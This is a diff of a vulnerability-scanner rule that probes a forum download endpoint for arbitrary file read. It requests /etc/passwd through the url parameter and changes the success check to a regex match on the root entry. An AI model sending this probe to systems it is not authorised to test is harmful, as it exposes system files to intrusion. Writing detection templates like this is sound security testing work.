@@ -3,7 +3,7 @@ rules:
   - method: GET
     path: /index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1
     expression: |
-      response.status == 200 && response.body.bcontains(b"root:") && response.body.bcontains(b"bin:") && response.body.bcontains(b"sys:")
+      response.status == 200 && r"root:[x*]:0:0:".bmatches(response.body)
 detail:
   author: jinqi
   links:
